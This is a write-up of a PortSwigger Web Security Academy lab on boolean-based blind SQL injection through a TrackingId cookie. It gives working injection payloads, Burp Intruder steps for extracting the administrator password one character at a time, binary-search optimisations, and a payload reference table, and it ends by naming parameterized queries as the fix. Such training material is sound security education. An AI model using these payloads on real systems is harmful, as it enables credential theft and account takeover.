# Blind SQL Injection with Conditional Responses — PortSwigger Web Security Academy

## Executive Summary

This assessment demonstrates the exploitation of a boolean-based blind SQL injection vulnerability affecting the `TrackingId` cookie. Because the application does not reflect query results or database errors, exfiltration is performed through an inference channel: the presence or absence of the `Welcome back` banner acts as a single-bit oracle. By injecting predicate expressions into the `WHERE` clause, it is possible to convert arbitrary SQL expressions into a TRUE/FALSE signal and, through iterative questioning, reconstruct the `administrator` password character by character.

The attack chain is:

1. Identify the injectable parameter and confirm statement context.
2. Establish a reliable boolean oracle using tautologies and contradictions.
3. Validate subquery evaluation semantics under SQL three-valued logic.
4. Enumerate the password length via a numeric comparison predicate.
5. Extract each character through `SUBSTRING()` and a brute-force charset.
6. Authenticate as `administrator` and complete the objective.

![img](2026-10-21_15-58.png)

## 1. Injection Point Identification

The `TrackingId` cookie is embedded into a backend query without parameterization. The baseline response includes the `Welcome back` banner, indicating that the query returns at least one row for a valid tracking identifier.

Appending a single quote to the cookie value breaks the string literal and alters the query structure:

![img](2026-10-21_15-59.png)

The disappearance of the banner confirms that the injected quote modified query evaluation. At this stage the behavior is consistent with a syntax or logic failure, but the absence of verbose errors means the vulnerability must be exploited blindly.

## 2. Establishing a Boolean Oracle

A true conditional is injected to verify that the backend evaluates attacker-controlled predicates and that the banner reflects the boolean outcome:

![img](2026-10-21_16-03.png)

The payload follows the form:

```sql
' AND 1=1--
```

With `1=1` the predicate is TRUE, the `WHERE` clause is satisfied, and the banner is rendered. Substituting a contradiction (`AND 1=2--`) removes the banner. This differential is the oracle used for all subsequent inference.

The resulting query approximates:

```sql
SELECT ...
FROM tracking
WHERE TrackingId = '<injected value>'
  AND <injected predicate>
```

The injected value closes the original string literal, injects an additional `AND` term, and comments out the remainder of the statement. The `--` sequence requires a trailing space in MySQL/MariaDB to be interpreted as a comment.

A second conditional confirms that subqueries against arbitrary tables can be evaluated within the predicate:

![img](2026-10-21_16-09.png)

```sql
' AND (SELECT 'a' FROM users LIMIT 1)='a'--
```

## 3. Subquery Semantics and Three-Valued Logic

The expression `(SELECT 'a' FROM users LIMIT 1)='a'` is a scalar subquery comparison and its behavior depends on cardinality and SQL's three-valued logic.

- `SELECT 'a' FROM users` projects the constant `'a'` once per row of `users`.
- `LIMIT 1` enforces scalar cardinality, ensuring at most one row is returned. Without it, a multi-row result would raise a cardinality error in most engines (`Subquery returns more than 1 row` in MySQL).
- If `users` contains at least one row, the subquery evaluates to `'a'`, so `'a'='a'` is TRUE.
- If `users` is empty, the scalar subquery evaluates to `NULL`. The comparison `NULL='a'` yields `UNKNOWN`, not FALSE. Because a `WHERE` clause only admits rows for which the predicate is TRUE, the `AND` term fails.

| State of `users` | Scalar subquery result | `= 'a'` evaluation | Row returned |
|---|---|---|---|
| At least one row | `'a'` | TRUE | Yes |
| Empty set | `NULL` | UNKNOWN | No |

This distinction matters: the construct does not prove the existence of a specific user, only that the table is non-empty. When the intent is an explicit existence check, `EXISTS` is semantically clearer and avoids scalar-cardinality assumptions:

```sql
AND EXISTS (SELECT 1 FROM users)
```

For record-specific predicates, the username must be constrained in the subquery, for example:

```sql
AND (SELECT COUNT(*) FROM users WHERE username='administrator')=1--
```

or, more directly, through a scalar projection:

```sql
AND (SELECT username FROM users WHERE username='administrator')='administrator'--
```

The lab description establishes that the `administrator` account exists. The extraction objective is therefore limited to recovering its password from the `users` table.

## 4. Confirming the Target Record

A conditional is injected to confirm that the `administrator` row is reachable through the injection point:

![img](2026-10-21_16-11.png)

```sql
' AND (SELECT 'a' FROM users WHERE username='administrator')='a'--
```

A rendered banner proves that the predicate resolves to TRUE, i.e., the filtered scalar subquery returns exactly the constant `'a'`. At this point the target row and the `password` column are known to be accessible.

## 5. Password Length Enumeration

The next predicate tests the password length. Rather than testing a single length, a threshold comparison is used:

```sql
' AND (SELECT LENGTH(password) FROM users WHERE username='administrator') > 1--
```

![img](2026-10-21_16-15.png)

The TRUE response confirms the length exceeds 1. To determine the exact length, the threshold is parameterized and iterated with Burp Intruder.

The numeric literal is marked as the payload position, and the payload type is set to `Numbers`:

![img](2026-10-21_16-17.png)

![img](2026-10-21_16-18.png)

The payload configuration is:

- From: `1`
- To: `30`
- Step: `1`

![img](2026-10-21_16-19.png)

The attack is executed and responses are compared by `Content-Length`, which is a stable proxy for the presence of the banner:

![img](2026-10-21_16-49.png)

The response size changes when the predicate flips from TRUE to FALSE. Given the predicate `LENGTH(password) > n`, the boundary occurs at `n = 20`: the condition still holds for `n = 19` and fails for `n = 20`, which establishes:

```sql
LENGTH(password) = 20
```

The length is therefore 20 characters. This is a monotonic predicate, so the search space is ordered and could also be resolved with a binary search in `O(log n)` requests instead of a linear scan.

## 6. Character-by-Character Extraction

With the length known, the password is reconstructed positionally using `SUBSTRING`, whose signature is `SUBSTRING(string, position, length)`:

```sql
' AND SUBSTRING(
      (SELECT password FROM users WHERE username='administrator'),
      <position>,
      1
    ) = '<candidate>'--
```

The first argument is the source string, the second is the 1-indexed starting offset, and the third is the number of characters to return. Extracting one character at a time keeps the predicate scalar and the oracle binary.

![img](2026-10-21_16-30.png)

The candidate character is marked as the payload position:

![img](2026-10-21_16-34.png)

The payload type is `Brute forcer`, which enumerates a charset rather than a known list:

![img](2026-10-21_16-35.png)

The payload configuration uses a minimum length of `1` and a maximum length of `1`, restricting each request to a single-character candidate:

![img](2026-10-21_16-35_1.png)

The attack is executed and `Content-Length` is inspected: the request whose response differs from the FALSE baseline corresponds to the correct character.

![img](2026-10-21_16-37.png)

For position 1, the oracle identifies `u` as the first character of the `administrator` password.

The position argument is then incremented, and the process is repeated:

![img](2026-10-21_16-38.png)

```sql
SUBSTRING(password, 2, 1)
SUBSTRING(password, 3, 1)
...
SUBSTRING(password, 20, 1)
```

Each position is resolved independently because the oracle leaks one bit per request and the search space per character is bounded by the charset size. With a 36-character alphanumeric charset, a linear brute force requires at most 36 requests per position; across 20 positions this is the dominant cost of the extraction.

### Optimization Notes

The linear brute force can be replaced by binary search over the character's ordinal value, reducing the per-character cost to approximately `log2(|charset|)` requests:

```sql
' AND ASCII(SUBSTRING(
      (SELECT password FROM users WHERE username='administrator'),
      <position>,
      1
    )) > <midpoint>--
```

`ASCII()` (or `ORD()` in MySQL) converts the character to an integer, enabling ordered comparisons. Engine-specific equivalents apply: `SUBSTR()` instead of `SUBSTRING()`, `TOP` instead of `LIMIT` on SQL Server, `ROWNUM` on Oracle, and `CHR()`/`CHAR()` for character construction. For a 20-character secret this approach reduces the request count from hundreds to roughly 120 comparisons, or fewer with a well-chosen charset partition.

## 7. Exfiltration Result and Lab Completion

After repeating the positional oracle for all 20 offsets, the full password is recovered. The credentials `administrator:<recovered password>` are then submitted to the login form:

![img](2026-10-21_16-46.png)

Authentication succeeds and the lab is solved. The vulnerability class is boolean-based blind SQL injection; its root cause is the concatenation of untrusted cookie data into a SQL statement. The structural remediation is the use of parameterized queries (prepared statements) with bound parameters, which prevents literal termination and predicate injection regardless of the boolean oracle's presence.

## Appendix — Payload Reference

| Purpose | Payload |
|---|---|
| Tautology (TRUE baseline) | `' AND 1=1--` |
| Contradiction (FALSE baseline) | `' AND 1=2--` |
| Table non-empty test | `' AND (SELECT 'a' FROM users LIMIT 1)='a'--` |
| Target row existence | `' AND (SELECT 'a' FROM users WHERE username='administrator')='a'--` |
| Length threshold | `' AND (SELECT LENGTH(password) FROM users WHERE username='administrator') > §n§--` |
| Positional character match | `' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),§pos§,1)='§char§'--` |
| Ordinal binary search | `' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='administrator'),§pos§,1)) > §mid§--` |
